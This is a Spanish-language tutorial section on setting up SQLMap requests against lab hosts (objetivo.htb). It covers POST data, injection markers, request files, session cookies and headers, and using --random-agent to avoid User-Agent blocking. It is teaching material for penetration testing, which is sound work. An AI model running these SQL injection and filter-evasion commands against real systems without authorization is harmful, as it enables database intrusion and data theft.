# Configurando el ataque: peticiones HTTP y autenticación

## Por qué la configuración correcta es tan importante

Errores aparentemente menores —olvidar una cookie de sesión, una cabecera necesaria, o formatear mal el cuerpo de una petición POST— son la causa más habitual de que SQLMap no detecte una vulnerabilidad que realmente existe. Antes de concluir que un parámetro no es inyectable, conviene asegurarse de que SQLMap está reproduciendo exactamente la misma petición que generaría un navegador autenticado normal.

## La forma más fiable: copiar la petición desde el navegador

Las DevTools del navegador (vistas en detalle en el bloque de *Web Requests*) ofrecen la opción **Copy as cURL** sobre cualquier petición de la pestaña Network. Pegando ese comando y sustituyendo `curl` por `sqlmap`, se obtiene una reproducción exacta de la petición original, con todas sus cabeceras, cookies y parámetros:

```bash
sqlmap 'http://objetivo.htb/?id=1' -H 'User-Agent: Mozilla/5.0...' -H 'Accept: ...' --compressed -H 'Connection: keep-alive'
```

## Peticiones GET y POST

Para parámetros `GET`, basta con `-u`/`--url` (el caso visto en los apartados anteriores). Para `POST`:

```bash
sqlmap 'http://objetivo.htb/' --data 'uid=1&name=test'
```

Por defecto, SQLMap prueba **todos** los parámetros detectados. Si ya se sabe cuál es el sospechoso, se puede limitar explícitamente con `-p`:

```bash
sqlmap 'http://objetivo.htb/' --data 'uid=1&name=test' -p uid
```

O marcar manualmente la posición de inyección con un asterisco, útil cuando se quiere probar un punto muy específico dentro de un valor compuesto:

```bash
sqlmap 'http://objetivo.htb/' --data 'uid=1*&name=test'
```

## Peticiones complejas: el archivo de petición (`-r`)

Cuando la petición tiene muchas cabeceras o un cuerpo extenso, resulta más práctico capturarla completa desde un proxy de intercepción (Burp, visto en el bloque de *Web Proxies*) y guardarla en un archivo de texto:

```
GET /?id=1 HTTP/1.1
Host: objetivo.htb
User-Agent: Mozilla/5.0...
Cookie: PHPSESSID=abc123
```

```bash
sqlmap -r peticion.txt
```

El mismo marcador con asterisco (`?id=*`) funciona dentro del archivo para indicar explícitamente la posición de inyección a probar.

## Especificando autenticación y cabeceras manualmente

```bash
sqlmap ... --cookie='PHPSESSID=abc123'
sqlmap ... -H 'Cookie: PHPSESSID=abc123'
```

Equivalente para `--host`, `--referer`, `-A/--user-agent`, cubriendo cualquier cabecera HTTP relevante para que la petición se procese exactamente como lo haría una sesión autenticada legítima.

### Evitando que el User-Agent delate a SQLMap

Por defecto, SQLMap se identifica con un `User-Agent` reconocible (`sqlmap/1.x.x (http://sqlmap.org)`), que muchas protecciones bloquean automáticamente solo por ese valor:

```bash
sqlmap ... --random-agent   # selecciona un User-Agent real al azar
sqlmap ... --mobile         # simula un dispositivo móvil
```

## Probando cabeceras como punto de inyección

SQLMap, por defecto, solo prueba parámetros HTTP estándar (query string, cuerpo POST). Para probar una cabecera concreta (Cookie, Referer, X-Forwarded-For...) como posible vector, se marca igual que cualquier otro parámetro:

```bash
sqlmap ... --cookie="id=1*"
```

## Métodos HTTP no estándar

```bash
sqlmap ... --method=PUT
```

Útil al auditar APIs REST (vistas en el bloque de *Web Requests*) que usan verbos distintos de GET/POST para sus operaciones CRUD.

## La regla de oro

Antes de concluir que SQLMap "no encuentra nada", conviene verificar primero que la petición reproducida es **exactamente** la que un usuario autenticado real generaría — incluyendo cookies de sesión válidas, cabeceras esperadas, y el formato correcto del cuerpo si se trata de JSON en lugar de `application/x-www-form-urlencoded`. El siguiente apartado profundiza en cómo diagnosticar sistemáticamente estos problemas cuando, pese a todo, algo sigue sin funcionar.
